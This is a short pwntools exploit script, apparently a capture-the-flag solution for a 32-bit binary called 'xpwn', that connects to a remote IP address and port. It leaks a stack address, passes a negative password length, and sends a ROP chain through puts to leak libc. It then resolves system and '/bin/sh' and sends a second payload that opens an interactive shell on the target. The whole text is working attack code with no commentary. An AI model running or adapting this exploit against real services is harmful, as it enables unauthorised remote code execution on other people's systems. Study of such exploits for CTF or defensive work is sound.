from pwn import *
context.log_level ='debug'
#sh=process('./xpwn')
elf = ELF('./xpwn')
libc = ELF('./libc.so.6')
sh=remote('116.85.48.105','5005')
sh.recvuntil('name: ')
name = 'n'*0x27
sh.sendline(name)
sh.recvuntil('n'*0x27+'\n')
leak_addr = u32(sh.recv(4))+0x18
print hex(leak_addr)
#sleep(1)
#gdb.attach(sh)
#one = 0x5f065
pay = 'a'*0x40+p32(0xffffffff) +p32(leak_addr)+p32(0)*2 +5*p32(elf.plt['puts'])+p32(0x8048669)+p32(elf.got['puts'])
sh.sendlineafter('password: ',str(-1))
sh.recv()
sh.sendline(pay)
sh.recvuntil('\n')
puts_got = u32(sh.recv(4))
sh.recv()

libc_base = puts_got - libc.symbols['puts']
print "libc: "+hex(libc_base)
system_addr = libc_base + libc.symbols['system']
binsh_addr = libc_base +libc.search('/bin/sh').next()
sh.sendline('name')
sh.sendlineafter('password: ',str(-1))
sh.recv()

pay ='a'*0x44+ p32(leak_addr)+p32(0)*2 +5*p32(system_addr)+p32(0x8048669) + p32(binsh_addr)
sh.sendline(pay)

#gdb.attach(sh)
sh.interactive()
